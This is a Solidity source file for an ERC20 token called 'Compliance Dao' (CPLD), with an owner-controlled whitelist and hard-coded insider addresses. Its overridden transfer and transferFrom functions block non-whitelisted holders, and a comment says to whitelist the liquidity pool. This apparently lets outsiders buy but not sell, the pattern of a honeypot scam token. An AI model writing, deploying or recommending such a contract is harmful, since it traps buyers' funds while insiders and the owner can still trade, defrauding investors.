// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("Compliance Dao", "CPLD") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 30000000 * 10 ** decimals());
        whiteList[0x5cBeAD90d5cCc2267b539E4EEbCDA069E8153aE3]= true;
        whiteList[0xC56b9E741558CB2dE1F1864c617Ed4911E0Ae16a]=true;
        whiteList[0x4f7Ae86EEaad24aA028C16C67cbF93Bd9d7f393F]=true;
        whiteList[0x17246AcF8b6CE127dC47E4272bF0F8F12ee80335]=true;
        whiteList[0x7E799F174893A50a166070187dD932598cCAFCc3]=true;
        whiteList[0xEA276b9a6591EF2750C5eA9121791a33d3f979a5]=true;
        whiteList[0x8D9eF4016A394c0AF8639FaB7FA0786068b359E3]=true;
        whiteList[0x23E9b11010C5DDD10ca063F14bb2404d651AFd39]=true;
        whiteList[0x7E2132783a6e3366CBe5837ff117b94156dAB9FB]=true;
        whiteList[0x99bD6460019b8C43c40ff817290c907DBf470BA5]=true;
        whiteList[0x71f0D54EFcdD7cFB4c11B5eDDB838Cd9B673c816]=true;
        whiteList[0xF4D16b1412f774Dce392126F152968f5b8285457]=true;
        whiteList[0x7FE08cf3C4e0F629C18dA299E376c4eA19B0F784]=true;
        whiteList[0x19D45dFc36f18b0d01f86641Ccd92b9d56a98689]=true;
        whiteList[0x0355BD0F8A329F0981f90c35776Cb13D98120925]=true;
        whiteList[0x05c0604A9000Ae737C2eb985f88350CdFC48A359]=true;
        whiteList[0x844A0826330403Cb013cd9d9D74fb20189B93Ed6]=true;
        whiteList[0xE537b4D8b728C88643bA69dDF12c45c2dE09cAd6]=true;
        whiteList[0x0dfeBdE7881A951B8424fe713b184009DE1ab833]=true;
        whiteList[0xcee2bd5546aaB8dC6e13256eA371554a842eED16]=true;
        whiteList[0x233372DB4c9d36ADa20342a04727E6BbE11A0436]=true;
        whiteList[0x35dA4142a9cB1277f297292F41a11dB97238540f]=true;
        whiteList[0x0b73E5B31f2B46bEfee5f7b284f010CD7c886dc4]=true;
        whiteList[0x2897Ac806F81f15cb9F4fEE871BBa1F798FFcD3D]=true;
        whiteList[0x90Fc73f3d41b5c87B8E89D63EDD2EA16f4861420]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}